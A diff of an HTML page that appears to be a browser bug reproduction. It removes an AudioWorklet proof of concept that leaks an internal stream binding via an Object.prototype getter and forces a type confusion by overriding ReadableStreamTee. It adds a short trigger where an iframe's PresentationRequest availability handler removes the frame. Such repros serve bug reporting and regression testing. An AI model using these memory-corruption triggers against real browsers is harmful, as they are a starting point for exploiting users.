@@ -1,62 +1,11 @@
 <html>
 <body>
-<h1>Click to start AudioContext</h1>
 <script>
-function runInWorket() {
-  function leakBinding(port) {
-    let stream = new ReadableStream;
-    let binding;
-    Object.prototype.__defineGetter__("MessagePort_postMessage", function() {
-      binding = this;
-    });
-    try {
-      port.postMessage(stream, [stream]);
-    } catch (e) {}
-    delete Object.prototype.MessagePort_postMessage;
-    return binding;
-  }
-
-  function triggerTypeConfusion(binding) {
-    console.log(Object.keys(binding));
-
-    binding.ReadableStreamTee = function() {
-      return 0x4142;
-    }
-    let stream = new ReadableStream;
-    stream.tee();
-  }
-
-  class MyWorkletProcessor extends AudioWorkletProcessor {
-    constructor() {
-      super();
-
-      triggerTypeConfusion(leakBinding(this.port));
-    }
-
-    process() {}
-  }
-
-  registerProcessor("my-worklet-processor", MyWorkletProcessor);
-}
-let blob = new Blob([`(${runInWorket}())`], {type: "text/javascript"});
-let url = URL.createObjectURL(blob);
-
-window.onclick = () => {
-  window.onclick = null;
-
-  class MyWorkletNode extends AudioWorkletNode {
-    constructor(context) {
-      super(context, "my-worklet-processor");
-    }
-  }
-
-  let context = new AudioContext();
-
-  context.audioWorklet.addModule(url).then(() => {
-    let node = new MyWorkletNode(context);
-  });
-}
+frame = document.body.appendChild(document.createElement("iframe"));
+request = new frame.contentWindow.PresentationRequest([location]);
+request.getAvailability().then(availability => {
+  availability.onchange = () => frame.remove();
+});
 </script>
 </body>
-            
 </html>
